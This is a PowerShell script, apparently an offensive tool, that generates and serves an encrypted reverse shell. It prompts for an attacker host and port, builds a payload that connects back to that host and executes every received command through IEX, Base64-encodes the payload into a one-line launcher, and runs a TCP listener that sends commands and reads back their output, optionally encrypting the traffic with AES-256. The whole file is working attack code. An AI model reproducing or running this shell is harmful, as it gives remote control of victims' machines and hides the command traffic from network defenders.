
### Reverse Encrypted (AES 256-bit) Shell over TCP using PowerShell SecureString. ###
### By: @ZHacker13 ###

$ASCII = @"
  _____                           _______ _____ _____      _____ _    _      _ _ 
 |  __ \                         |__   __/ ____|  __ \    / ____| |  | |    | | |
 | |__) |_____   _____ _ __ ___  ___| | | |    | |__) |  | (___ | |__| | ___| | |
 |  _  // _ \ \ / / _ \ '__/ __|/ _ \ | | |    |  ___/    \___ \|  __  |/ _ \ | |
 | | \ \  __/\ V /  __/ |  \__ \  __/ | | |____| |        ____) | |  | |  __/ | |
 |_|  \_\___| \_/ \___|_|  |___/\___|_|  \_____|_|       |_____/|_|  |_|\___|_|_|
                                                     
                                                                                     - By: @ZHacker13                                                                                                           
"@;

Write-Host $ASCII;

While($Choose -ne "1" -And $Choose -ne "2")
{
	  Write-Host "`n 1 = Clear Shell";
	  Write-Host " 2 = Encrypted (AES 256-bit) Shell";
      $Choose = Read-Host "`n - Choose (1,2)";
}

While($Check -ne $True)
{
	  $Check = $True;
      $Port = Read-Host "`n - Remote Port";
      netstat -na | Select-String LISTENING | %{
      If(($_.ToString().split(":")[1].split(" ")[0]) -eq "$Port")
    {
        Write-Host "`n [*] The Port [`"$Port`"] already in use [*]";
        $Check = $False;
    }
  }
}

$IP = Read-Host "`n - Remote Host";

If($Choose -eq "1")
{
   $Payload = "`$Client=New-Object System.Net.Sockets.TCPClient('$IP',$Port);`$Stream=`$Client.GetStream();[byte[]]`$Bytes=0..65535|%{0};while((`$Read=`$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$Command=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$Read);`$OutPut=(IEX(`$Command) 2>&1 | Out-String);`$SendByte=([text.encoding]::ASCII).GetBytes(`$OutPut);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();Exit";
}

If($Choose -eq "2")
{
   $Base64 = [Convert]::ToBase64String((1..32 | %{[byte](Get-Random -Minimum 0 -Maximum 255)}));
   $Key = ([Convert]::FromBase64String($Base64));
   $Payload = "`$Base64=`"$Base64`";`$Key=([Convert]::FromBase64String(`$Base64));`$Client=New-Object System.Net.Sockets.TCPClient('$IP',$Port);`$Stream=`$Client.GetStream();[byte[]]`$Bytes=0..65535|%{0};while((`$Read=`$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$Command=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$Read);`$DeCode=`$Command | ConvertTo-SecureString -Key `$Key;`$OutPut=(IEX([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR(`$DeCode))) 2>&1 | Out-String);`$EnCode=ConvertTo-SecureString `$OutPut -AsPlainText -Force | ConvertFrom-SecureString -Key `$Key;`$SendByte=([text.encoding]::ASCII).GetBytes(`$EnCode);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();Exit";
}

$Base64Payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Payload));
Clear-Host;
Write-Host $ASCII;
Write-Host "`n - Remote Port:"$Port"";
Write-Host " - Remote Host:"$IP"";
Write-Host "`n [*] Payload: [*]";
Write-Host "`nECHO IEX([string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String({$Base64Payload}))));Exit | PowerShell -";
Write-Host "`n [*] Listeneing on Port `"$Port`" [*]";
$Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $Port);
$Socket.Start();
$Client = $Socket.AcceptTcpClient();
Write-Output " [*] Connection ! [*]";
Write-Output " [*] Please Wait ... [*]`n";
$Stream = $Client.GetStream();
[byte[]]$Bytes = 0..65535|%{0};

While($Client.Connected -eq $true)
{
       $Command = Read-Host " - Command";
       If($Command -eq "Exit")
   {
       break;
   }
       If($Choose -eq "2")
   {
       $EnCode = ConvertTo-SecureString $Command -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;
       $Command = $EnCode;
   }
       $SendByte = ([text.encoding]::ASCII).GetBytes($Command);
       $Stream.Write($SendByte,0,$SendByte.Length);
       $Stream.Flush();
       $Read = $null;
       While($Stream.DataAvailable -or $Read -eq $null)
   {
       $Read = $Stream.Read($Bytes, 0, 65535);
       $OutPut = ([text.encoding]::ASCII).GetString($Bytes, 0, $Read);
       If($Choose -eq "2")
   {
       $DeCode = $OutPut | ConvertTo-SecureString -Key $Key;
       $OutPut = ([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DeCode)));
   }
       Write-Output $OutPut;
 }
}

$Socket.Stop();
$Client.Close();
$Stream.Dispose();
